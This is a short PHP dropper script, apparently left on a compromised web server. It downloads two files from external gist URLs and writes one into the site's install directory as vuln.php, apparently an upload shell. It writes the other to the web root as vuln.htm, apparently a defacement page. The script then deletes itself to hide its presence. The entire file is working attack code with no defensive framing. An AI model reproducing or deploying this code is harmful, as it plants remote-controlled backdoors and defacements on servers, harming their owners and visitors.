<title>Vuln!! patch it Now!</title>
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/install/includes/vuln.php" ;
$text = http_get('https://gist.githubusercontent.com/redookay/04af8650fa04663331746a3e0e670ea1/raw/428440a715d6b8f5f072d3a53295cdad686fae52//up.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = http_get('https://gist.githubusercontent.com/redookay/fd0bcffc94ae2ff90d1d7623c38b9a92/raw/7cd86a4155ec462dd3c9031b02a26f3acc2572a9/vuln.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
@unlink(__FILE__);
?>
